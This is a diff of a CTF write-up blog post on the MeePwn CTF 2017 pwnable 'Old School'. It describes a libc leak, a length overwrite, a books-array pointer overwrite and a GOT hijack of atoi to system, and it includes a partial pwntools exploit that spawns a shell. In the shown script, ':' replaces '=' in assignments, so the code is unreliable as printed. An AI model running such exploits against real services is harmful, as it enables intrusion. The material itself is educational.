@@ -1,15 +1,15 @@
 ---
 type: ctf
-title : MeePwn CTF 2017 - Old School
+title: MeePwn CTF 2017 - Old School
 tags: [MeePwn CTF, Old School]
-date : 2017-07-16
+date: 2017-07-16
 author: Eno
 featuredImage: https://ctftime.org/media/events/meepo_size_lon_.png
 ---
 
 **Category:** Pwnable
 
-64 bit ELF, Partial RELRO, NX enabled, No PIE, has canary.  
+64 bit ELF, Partial RELRO, NX enabled, No PIE, has canary.
 
 ```
 -------- BookStore --------
@@ -20,7 +20,8 @@ featuredImage: https://ctftime.org/media/events/meepo_size_lon_.png
 5.       Exit.
 ```
 
-As we can see we can add, edit, delete or show a book. Books are stored in a pointer array `books`, each pointer point to a `book` data structure:  
+As we can see we can add, edit, delete or show a book. Books are stored in a pointer array `books`, each pointer point
+to a `book` data structure:
 
 ```c
 struct book{
@@ -31,9 +32,11 @@ struct book{
 }
 ```
 
-The `books` array and each `book` pointer are all placed on the stack memory.  
+The `books` array and each `book` pointer are all placed on the stack memory.
 
-The program did not initialize the `book` variable before setting its data. Since there's a libc address ( `<atoi + 0x10>` ) in it, we can leak the libc address by entering 4 characters in the description:  
+The program did not initialize the `book` variable before setting its data. Since there's a libc address (
+`<atoi + 0x10>` ) in it, we can leak the libc address by entering 4 characters in the description:
+
 ```
 Choice:4
 ------------ 1 ------------
@@ -48,16 +51,21 @@ Description: AAAA�N���
 5.       Exit.
 ```
 
-After done some fuzzing, I also found that if we input 32 characters in `book_name` and `author` ( no newline ) , the `desc_len` will be overwritten with our input, and become a large integer. Since when we edit the book description, the length to read is depend on the `desc_len` data, this make us able to overflow the `book->description` buffer and overwrite the pointers in the `books` array !  
+After done some fuzzing, I also found that if we input 32 characters in `book_name` and `author` ( no newline ) , the
+`desc_len` will be overwritten with our input, and become a large integer. Since when we edit the book description, the
+length to read is depend on the `desc_len` data, this make us able to overflow the `book->description` buffer and
+overwrite the pointers in the `books` array !
 
 So here's how I exploit the service:
+
 1. First leak the libc address
 2. Overwrite the `desc_len` data
 3. Overflow the `books[0]->desc` buffer and overwrite `books[0]`, let it point to the GOT section
 4. Edit `books[0]` and do the GOT hijacking ( hijack atoi to system )
 
-
-The exploit at the local side worked, but for some unknown reason, the service at the remote side has a different behavior: during the last step of the exploitation, it won't let us input the `author` data, thus failing our exploit. Although we can still pwn it by not entering the author's name, it still took me a while to debug the whole process.  
+The exploit at the local side worked, but for some unknown reason, the service at the remote side has a different
+behavior: during the last step of the exploitation, it won't let us input the `author` data, thus failing our exploit.
+Although we can still pwn it by not entering the author's name, it still took me a while to debug the whole process.
 
 ```python exp_oldschool.py
 #!/usr/bin/env python
@@ -104,22 +112,22 @@ def show_book():
 if __name__ == "__main__":
 
     r : remote(HOST, PORT)
-   
-    book, author : "1"*8+"\n", "a"*8+"\n"  
+
+    book, author : "1"*8+"\n", "a"*8+"\n"
     add_book(book, author, 100, "AAAA\n")
     show_book()
-    
+
     # leak libc
     r.recvuntil("AAAA")
     libc.address : u64(r.recv(6).ljust(8, "\x00")) - libc.symbols['atoi'] - 0x10
     log.success("libc_base: "+hex(libc.address))
 
     del_book(1)
-    book, author : "1"*32, "a"*32  
+    book, author : "1"*32, "a"*32
     # make book[0]->size : very big
     # later when we edit book[0]->desc, it will overwrite the pointer of book[0]
     add_book(book, author, 100, "AAAA\n")
-   
+
     # edit book[1]->desc, overwrite book[0]
     # change book[0]->name to got section
     # later we can edit book[0] & do GOT hijacking
@@ -135,12 +143,10 @@ if __name__ == "__main__":
     # don't know why author won't read input.....
     #r.sendafter("uthor:", author)
     r.sendafter("tion:", desc)
- 
+
     r.sendline("sh")
     r.interactive()
 
 ```
 
 flag: `MeePwnCTF{0ld_sch00ld_C4n4ry_1s_0n_th3_st4ck}`
-
-
